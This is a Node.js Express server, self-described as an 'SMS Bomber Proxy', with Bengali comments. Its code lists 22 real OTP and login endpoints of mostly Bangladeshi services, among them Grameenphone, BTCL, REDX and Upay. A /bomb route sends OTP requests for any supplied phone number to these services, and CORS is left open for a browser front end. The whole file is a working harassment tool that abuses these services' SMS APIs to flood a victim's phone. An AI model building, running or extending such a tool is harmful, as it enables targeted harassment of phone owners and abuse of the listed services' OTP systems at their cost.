const express = require('express');
const fetch = require('node-fetch'); // Node 18+ এ built-in fetch ব্যবহার করতে পারেন
const app = express();
app.use(express.json());

// CORS enable for your client side
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// ================== API কনফিগারেশন ==================
const apis = [
    {
        name: "Amazon OTP",
        url: "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Bioscope Live",
        url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Chorki",
        url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Apex4u",
        url: "https://api.apex4u.com/api/auth/login",
        body: (cc, ph) => ({ email_or_mobile: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Chardike",
        url: "https://api.chardike.com/api/otp/send",
        body: (cc, ph) => ({ mobile: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Deeptoplay",
        url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Garibook Admin",
        url: "https://api.garibookadmin.com/api/v3/user/login",
        body: (cc, ph) => ({ mobile: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Ghoori Learning",
        url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Ostad",
        url: "https://api.ostad.app/api/v2/user/with-otp",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "REDX",
        url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        body: (cc, ph) => ({ phone_number: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Shikho",
        url: "https://api.shikho.com/public/activity/otp",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Upay System",
        url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        body: (cc, ph) => ({ mobileNumber: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Timezone BD",
        url: "https://backend.timezonebd.com/api/v1/user/otp-login",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Bohubrihi",
        url: "https://bb-api.bohubrihi.com/public/activity/otp",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Grameenphone",
        url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        body: (cc, ph) => ({ msisdn: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Easy.com.bd",
        url: "https://core.easy.com.bd/api/v1/forgot-password-otp",
        body: (cc, ph) => ({ mobile: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Quizgiri",
        url: "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Otithee",
        url: "https://gateway.otithee.com/api/v1/generate-otp",
        body: (cc, ph) => ({ mobile: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "BTCL",
        url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
        body: (cc, ph) => ({ phoneNumber: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "ieducationbd",
        url: "https://www.ieducationbd.com/api/account/check_user",
        body: (cc, ph) => ({ mobile: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Walton Plaza",
        url: "https://waltonplaza.com.bd/api/auth/otp/create",
        body: (cc, ph) => ({ mobile: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    },
    {
        name: "Mojaru",
        url: "https://new.mojaru.com/api/student/login",
        body: (cc, ph) => ({ phone: cc + ph }),
        headers: { 'Content-Type': 'application/json' }
    }
];

// ================== Endpoint ==================
app.post('/bomb', async (req, res) => {
    const { cc, ph, apiIndex } = req.body;
    if (apiIndex === undefined || apiIndex < 0 || apiIndex >= apis.length) {
        return res.status(400).json({ success: false, error: 'Invalid apiIndex' });
    }
    if (!cc || !ph) {
        return res.status(400).json({ success: false, error: 'Missing cc or ph' });
    }
    const api = apis[apiIndex];
    try {
        const response = await fetch(api.url, {
            method: 'POST',
            headers: api.headers,
            body: JSON.stringify(api.body(cc, ph))
        });
        const status = response.status;
        // কিছু API success হলেও 4xx দিতে পারে, আমরা ok check করি
        const success = response.ok;
        // কিছু ক্ষেত্রে response text see করতে পারেন
        res.json({ success, status, name: api.name });
    } catch (error) {
        res.json({ success: false, error: error.message, name: api.name });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`SMS Bomber Proxy running on port ${PORT}`);
});
